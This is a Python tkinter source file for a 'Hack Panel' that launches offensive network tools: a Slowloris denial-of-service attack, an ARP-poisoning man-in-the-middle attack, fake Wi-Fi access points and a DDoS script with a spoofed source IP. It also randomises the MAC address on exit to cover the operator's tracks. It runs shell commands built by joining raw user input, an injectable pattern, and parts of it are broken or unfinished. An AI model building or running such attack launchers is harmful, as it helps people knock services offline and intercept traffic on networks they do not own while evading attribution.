from tkinter import *
import tkinter as tk
from tkinter.ttk import *
import os as operating_system
import platform as plat
import time
import scapy as scap
from scapy.all import *
from scapy.contrib.eigrp import *
from scapy.all import sendp
import keyboard
from sqlalchemy import true

class dossing_panel(tk.Toplevel):
    def __init__(self, parent):
        super().__init__(parent)

        self.geometry('300x450')
        self.title('Dossing Window')

        #############################
        #      DOSSING PANEL        #
        #############################
        def randomise_mac_linux():
            operating_system.system('sudo python randomise_mac_linux.py wlan0 -r')

        def randomise_mac_win():
            operating_system.system('python randomise_mac_windows.py -r')

        def quit_program():
            os = plat.system()
            if os == "Linux":
                randomise_mac_linux()
            elif os == "Windows":
                randomise_mac_win()
            else:
                print("OS IS NOT SUPPORTED")
                pass

            self.destroy()

            print("Quitting Now")

        #STARTING SLOWLORIS
        def startSlowloris():
            command = "slowloris.py"

            os = plat.system()

            #IP TARGET CONFIG
            inp_IP = inputtxt1.get(1.0, "end-1c")
            command = command + " " + inp_IP

            #PORT CONFIG
            inp_P = inputtxt2.get(1.0, "end-1c")
            if inp_P == "":
                command = command
            else:
                command = command + " -p " + inp_P

            #SOCKET COUNT CONFIG
            inp_SOCK = inputtxt3.get(1.0, "end-1c")
            if inp_SOCK == "":
                command = command
            else:
                command = command + " -s " + inp_SOCK
            
            #EXTRA OPTIONS
            inp_EXTRA = inputtxt4.get(1.0, "end-1c")
            if inp_EXTRA == "":
                command = command
            else:
                command = command + " " + inp_EXTRA
            
            
            ################################################################
            # SPOOFERS AND MORE

            if os == "Linux":
                randomise_mac_linux()
            elif os == "Windows":
                randomise_mac_win()
            else:
                print("OS IS NOT SUPPORTED")
                pass



            operating_system.system('python ' + command)

        def helpSlowloris():
            operating_system.system('python slowloris.py --help')

        label = Label(self, text ="DoS Panel | By aziv1")
        label.pack(pady = 10)

        #Start Slowloris Button, For Testing
        btn2 = Button(self, text ="Excecute", command = startSlowloris)
        btn2.pack(pady = 10)

        #GET SLOWLORIS HELP
        btn3 = Button(self, text ="Slowloris Help", command = helpSlowloris)
        btn3.pack(pady = 10)

        text = Label(self, text="IP TO ATTACK")
        text.pack(pady=10)

        # TextBox For IP
        inputtxt1 = Text(self, height = 1, width = 20)
        inputtxt1.pack()

        text = Label(self, text="PORT TO ATTACK")
        text.pack(pady=10)

        # TextBox For Port
        inputtxt2 = Text(self, height = 1, width = 20)
        inputtxt2.pack()

        text = Label(self, text="AMOUNT OF SOCKETS")
        text.pack(pady=10)

        # TextBox For Port
        inputtxt3 = Text(self, height = 1, width = 20)
        inputtxt3.pack()

        text = Label(self, text="EXTRA OPTIONS")
        text.pack(pady=10)

        # TextBox For EXTRA
        inputtxt4 = Text(self, height = 1, width = 20)
        inputtxt4.pack()

        # BUTTON For Close
        btn3 = Button(self, text ="Close", command = quit_program)
        btn3.pack(pady = 10)

        # mainloop, runs infinitely
        mainloop()

class mac_changer(tk.Toplevel):
    def __init__(self, parent):
        super().__init__(parent)

        self.geometry('300x150')
        self.title('Mac Changer')

        def quit_program():
            self.destroy()
        
        def randomise_mac_linux():
            operating_system.system('sudo python randomise_mac_linux.py wlan0 -r')

        def randomise_mac_win():
            operating_system.system('python randomise_mac_windows.py -r')

        def select_mac_linux(mac):
            operating_system.system('sudo python randomise_mac_linux.py wlan0 -m ' + mac)

        def select_mac_win(mac):
            operating_system.system('python randomise_mac_windows.py -m ' + mac)

        def randomise_mac():
            os = plat.system()

            if os == "Linux":
                randomise_mac_linux()
            elif os == "Windows":
                randomise_mac_win()
            else:
                print("OS IS NOT SUPPORTED")
                pass

        def select_mac():
            os = plat.system()

            mac = inp_mac.get(1.0, "end-1c")
            if mac == "":
                randomise_mac()
            else:
                if os == "Linux":
                    select_mac_linux(mac)
                elif os == "Windows":
                    select_mac_win(mac)
                else:
                    print("OS IS NOT SUPPORTED")
                    pass

        tk.Label(self, text="MAC CHANGER").pack(expand=True)
        tk.ttk.Button(self, text="Randomise Mac", command = randomise_mac).pack(expand=True)
        tk.ttk.Button(self, text="Select Mac", command = select_mac).pack(expand=True)
        inp_mac = Text(self, height = 1, width = 20)
        inp_mac.pack(expand=True)
        tk.ttk.Button(self, text="Close", command = quit_program).pack(expand=True)

class MIM_ARP_Poisener(tk.Toplevel):
    def __init__(self, parent):
        super().__init__(parent)

        self.geometry('300x250')
        self.title('ARP MIM Poisener/Attack')

        def randomise_mac_linux():
            operating_system.system('sudo python randomise_mac_linux.py wlan0 -r')

        def randomise_mac_win():
            operating_system.system('python randomise_mac_windows.py -r')

        def run_poisiner_linux():
            tar_ip = tar_ip_inp.get(1.0, "end-1c")
            hst_ip = tar_host_inp.get(1.0, "end-1c")

            operating_system.system('sudo python arp_spoofer.py ' + tar_ip + ' ' + hst_ip)

        def quit_program():
            os = plat.system()
            if os == "Linux":
                randomise_mac_linux()
            elif os == "Windows":
                randomise_mac_win()
            else:
                print("OS IS NOT SUPPORTED")
                pass

            self.destroy()

            print("Quitting Now")
        
        def help():
            operating_system.system('sudo python arp_spoofer.py -h')

        title = tk.Label(self, text='ARP MIM Poisener/Attack')
        title.pack()

        text = Label(self, text="TARGET IP")
        text.pack(pady=5)

        # TextBox For TARGET
        tar_ip_inp = Text(self, height = 1, width = 20)
        tar_ip_inp.pack()

        text = Label(self, text="HOST IP")
        text.pack(pady=5)

        # TextBox For HOST
        tar_host_inp = Text(self, height = 1, width = 20)
        tar_host_inp.pack(pady=5)

        _excecute = tk.ttk.Button(self, text="EXCECUTE", command=run_poisiner_linux)
        _excecute.pack(pady=5)

        _help = tk.ttk.Button(self, text="HELP", command=help)
        _help.pack(pady=5)
        
        _close = tk.ttk.Button(self, text="Close (USE IT)", command=quit_program)
        _close.pack(pady=5)

class fake_ap_hacks(tk.Toplevel):
    def __init__(self, parent):
        super().__init__(parent)
    
        self.geometry('300x240')
        self.title('Start Fake AP')

        def randomise_mac_linux():
            operating_system.system('sudo python randomise_mac_linux.py wlan0 -r')

        def randomise_mac_win():
            operating_system.system('python randomise_mac_windows.py -r')

        def quit_program():
            os = plat.system()
            if os == "Linux":
                randomise_mac_linux()
            elif os == "Windows":
                randomise_mac_win()
            else:
                print("OS IS NOT SUPPORTED")
                pass

            self.destroy()

            print("Quitting Now")


        def start_ap():
            interface = interface_inp.get(1.0, "end-1c")
            number_of = num_inp.get(1.0, "end-1c")
            
            os.system("sudo python fakeap.py " + interface + " -n " + number_of)
        
        def end_ap():
            quit()
        
        tk.Label(self, text='FAKE AP HACK').pack(expand=True)        

        # TextBox For FAKE IP
        text = Label(self, text="Interface eg. wlan0")
        text.pack(pady=5)

        interface_inp = Text(self, height = 1, width = 20)
        interface_inp.pack()

        # TextBox For PORT
        text = Label(self, text="Number Of Points to Generate")
        text.pack(pady=5)

        num_inp = Text(self, height = 1, width = 20)
        num_inp.pack()

        tk.ttk.Button(self, text='Start', command=start_ap).pack(expand=True)
        tk.ttk.Button(self, text='End', command=end_ap).pack(expand=True)
        tk.ttk.Button(self, text='Quit', command=quit_program).pack(expand=True)

class ddosser_hack(tk.Toplevel):
    def __init__(self, parent):
        super().__init__(parent)
    
        self.geometry('300x320')
        self.title('DDOSSER HACK WINDOWS')

        def randomise_mac_linux():
            operating_system.system('sudo python randomise_mac_linux.py wlan0 -r')

        def randomise_mac_win():
            operating_system.system('python randomise_mac_windows.py -r')

        def quit_program():
            os = plat.system()
            if os == "Linux":
                randomise_mac_linux()
            elif os == "Windows":
                randomise_mac_win()
            else:
                print("OS IS NOT SUPPORTED")
                pass

            self.destroy()
        
        def run_ddosser():
            target = tar_ip_inp.get(1.0, "end-1c")
            fake_ip = fake_ip_inp.get(1.0, "end-1c")
            port = port_inp.get(1.0, "end-1c")

            os.system("sudo python ddosser.py -t "+ target + " -f " + fake_ip + " -p " + port)

        tk.Label(self, text='DDOSSER Window (USE WITH CAUTION)').pack(expand=True)

        # TextBox For TARGE
        text = Label(self, text="TARGET IP")
        text.pack(pady=5)

        tar_ip_inp = Text(self, height = 1, width = 20)
        tar_ip_inp.pack()

        # TextBox For FAKE IP
        text = Label(self, text="SPOOFED IP (DO NOT ENTER YOU OWN)")
        text.pack(pady=5)

        fake_ip_inp = Text(self, height = 1, width = 20)
        fake_ip_inp.pack()

        # TextBox For PORT
        text = Label(self, text="TARGET PORT (MUST BE OPEN)")
        text.pack(pady=5)

        port_inp = Text(self, height = 1, width = 20)
        port_inp.pack()

        tk.ttk.Button(self, text="Excecute", command=run_ddosser).pack(expand=True)
        tk.ttk.Button(self, text='Quit (USE IT)', command=quit_program).pack(expand=True)

class port_scanner(tk.Toplevel):
    def __init__(self, parent):
        super().__init__(parent)
    
        self.geometry('300x350')
        self.title('OPEN PORT SCANNER')

        def randomise_mac_linux():
            operating_system.system('sudo python randomise_mac_linux.py wlan0 -r')

        def randomise_mac_win():
            operating_system.system('python randomise_mac_windows.py -r')

        def quit_program():
            os = plat.system()
            if os == "Linux":
                randomise_mac_linux()
            elif os == "Windows":
                randomise_mac_win()
            else:
                print("OS IS NOT SUPPORTED")
                pass

            self.destroy()

        def run():
            ports = ports_inp.get(1.0, "end-1c")
            ip = ip_inp.get(1.0, "end-1c")

            

        tk.Label(self, text="OPEN PORT SCANNER").pack(expand=True)

        # TextBox For FAKE IP
        text = Label(self, text="IP TO SCAN")
        text.pack(pady=5)

        ip_inp = Text(self, height = 1, width = 20)
        ip_inp.pack()

        # TextBox For PORT
        text = Label(self, text="Ports to scan, eg. 1-65535")
        text.pack(pady=5)

        ports_inp = Text(self, height = 1, width = 20)
        ports_inp.pack()

        tk.ttk.Button(self, text='Quit', command=quit_program).pack(expand=True)
        

class master(tk.Tk):
    def __init__(self):
        super().__init__()

        self.geometry('300x280')
        self.title('Main Window')

        def quit_program():
            quit()

        tk.Label(self, text="WELCOME TO THE HACK PANEL").pack(expand=True)
        tk.ttk.Button(self, text='Open Dossing Window', command=self.open_window_dosing).pack(expand=True)
        tk.ttk.Button(self, text='Open MAC Changer Window', command=self.open_window_mac_changer).pack(expand=True)
        tk.ttk.Button(self, text='Open MIM Arp Poisner Window', command=self.open_arp_poisener).pack(expand=True)
        tk.ttk.Button(self, text='Open FAKE AP STARTER', command=self.open_fakeap_hack).pack(expand=True)
        tk.ttk.Button(self, text='Open DDOSSER Hack Window', command=self.open_ddosser_hack).pack(expand=True)
        tk.ttk.Button(self, text='Open Port Scanner (OPEN)', command=self.open_port_scanner).pack(expand=True)
        tk.ttk.Button(self, text='Quit', command=quit_program).pack(expand=True)

    def open_window_dosing(self):
        window = dossing_panel(self)
        window.grab_set()

    def open_window_mac_changer(self):
        window = mac_changer(self)
        window.grab_set()
    
    def open_arp_poisener(self):
        window = MIM_ARP_Poisener(self)
        window.grab_set()
    
    def open_fakeap_hack(self):
        window = fake_ap_hacks(self)
        window.grab_set()

    def open_ddosser_hack(self):
        window = ddosser_hack(self)
        window.grab_set()

    def open_port_scanner(self):
        window = port_scanner(self)
        window.grab_set

if __name__ == "__main__":
    app = master()
    app.mainloop()



